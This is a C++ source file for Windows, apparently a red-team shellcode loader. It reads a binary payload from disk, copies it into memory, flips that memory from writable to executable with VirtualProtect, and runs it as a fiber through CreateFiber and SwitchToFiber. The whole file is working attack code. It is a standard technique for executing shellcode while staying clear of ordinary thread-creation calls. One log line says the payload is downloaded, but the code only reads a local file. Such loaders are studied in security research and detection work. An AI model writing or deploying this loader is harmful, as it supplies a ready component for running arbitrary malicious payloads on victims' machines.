#include <Windows.h>
#include <fstream>
#include <iostream>
#include <iterator>
#include <vector>

std::vector<BYTE> ReadPayload(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return {};
    return std::vector<BYTE>((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: <executable>.exe <payload.bin>\n";
        return 1;
    }

    std::vector<BYTE> payload = ReadPayload(argv[1]);
    if (payload.empty()) { std::cerr << "[-] Failed to read payload\n"; return 1; }
    std::cout << "[+] Step 1: Downloading payload\n";
    std::cout << "[+] Downloaded " << payload.size() << " bytes\n";

    LPVOID execMem = VirtualAlloc(NULL, payload.size(),
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execMem) { std::cerr << "[-] Memory allocation failed\n"; return 1; }
    memcpy(execMem, payload.data(), payload.size());

    DWORD oldProtect = 0;
    if (!VirtualProtect(execMem, payload.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] VirtualProtect failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Step 2: Allocated memory (RW -> RX) at: " << execMem << "\n";
    std::cout << "[+] Step 3: Executing via Fiber\n";

    LPVOID mainFiber = ConvertThreadToFiber(NULL);    
    if (!mainFiber) {
        std::cerr << "[-] ConvertThreadToFiber failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Current thread converted to fiber\n";

    LPVOID payloadFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)execMem, NULL);
    if (!payloadFiber) {
        std::cerr << "[-] CreateFiber failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Fiber created: " << payloadFiber << " (payload)\n";
    std::cout << "[+] Switching to payload fiber\n";

    SwitchToFiber(payloadFiber);                       
    DeleteFiber(payloadFiber);
    ConvertFiberToThread();
    return 0;
}